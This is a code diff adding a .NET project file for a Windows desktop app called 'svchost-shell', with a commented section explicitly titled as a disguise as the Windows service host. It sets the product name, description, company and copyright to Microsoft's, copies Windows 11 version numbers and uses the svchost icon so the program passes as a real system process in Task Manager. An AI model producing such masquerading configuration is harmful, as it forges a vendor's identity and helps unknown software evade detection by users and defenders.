@@ -1,0 +1,48 @@
+﻿<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net8.0-windows</TargetFramework>
+    <Nullable>enable</Nullable>
+    <UseWPF>true</UseWPF>
+    <UseWindowsForms>true</UseWindowsForms>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationHighDpiMode>PerMonitorV2</ApplicationHighDpiMode>
+    
+    <!-- ═══════════════════════════════════════════════════════════════ -->
+    <!-- DISGUISE AS WINDOWS SERVICE HOST -->
+    <!-- ═══════════════════════════════════════════════════════════════ -->
+    
+    <!-- Executable name -->
+    <AssemblyName>svchost-shell</AssemblyName>
+    
+    <!-- Product name (appears in Task Manager "Description") -->
+    <Product>Host Process for Windows Services</Product>
+    
+    <!-- Description -->
+    <Description>Secure Shell Service Host</Description>
+    
+    <!-- Company (makes it look official) -->
+    <Company>Microsoft Corporation</Company>
+    
+    <!-- Copyright -->
+    <Copyright>© Microsoft Corporation. All rights reserved.</Copyright>
+    
+    <!-- File version (matches Windows 11 23H2) -->
+    <FileVersion>10.0.22631.4602</FileVersion>
+    <AssemblyVersion>10.0.22631.4602</AssemblyVersion>
+    
+    <!-- Use svchost icon -->
+    <ApplicationIcon>svchost.ico</ApplicationIcon>
+    
+  </PropertyGroup>
+
+  <ItemGroup>
+    <PackageReference Include="Microsoft.Data.Sqlite" Version="8.0.8" />
+    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
+    <PackageReference Include="System.Drawing.Common" Version="8.0.0" />
+    <PackageReference Include="Microsoft.Web.WebView2" Version="1.0.2739.15" />
+    <PackageReference Include="Markdig.Wpf" Version="0.5.0.1" /> 
+  </ItemGroup>
+
+</Project>
